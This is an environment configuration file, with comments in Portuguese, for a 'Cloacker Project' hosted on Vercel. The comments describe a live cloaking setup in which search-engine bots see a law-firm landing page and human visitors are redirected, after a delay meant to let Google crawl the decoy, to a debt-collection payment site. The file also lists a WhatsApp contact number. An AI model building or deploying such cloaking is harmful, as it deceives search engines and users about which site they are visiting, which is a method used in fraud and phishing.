# Variáveis de Ambiente - Cloacker Project
# Para deployar no Vercel, configure estas variáveis no painel do Vercel

# Cloaking Control
# false = Phase 1 (todos veem landing page de advocacia)
# true = Phase 2 (bots veem advocacia, humanos veem redirect para cobrança)
CLOAKING_ENABLED=true

# WhatsApp Contact
NEXT_PUBLIC_WHATSAPP_PHONE=5511986324895

# URL da página de cobrança (Paschoalotto)
# Humanos são redirecionados para esta URL
NEXT_PUBLIC_COBRANCA_URL=https://pagoufacil.com.br

# Tempo de delay antes do redirect (em millisegundos)
# Permite que Google crawle a página antes de redirecionar
REDIRECT_DELAY=2000
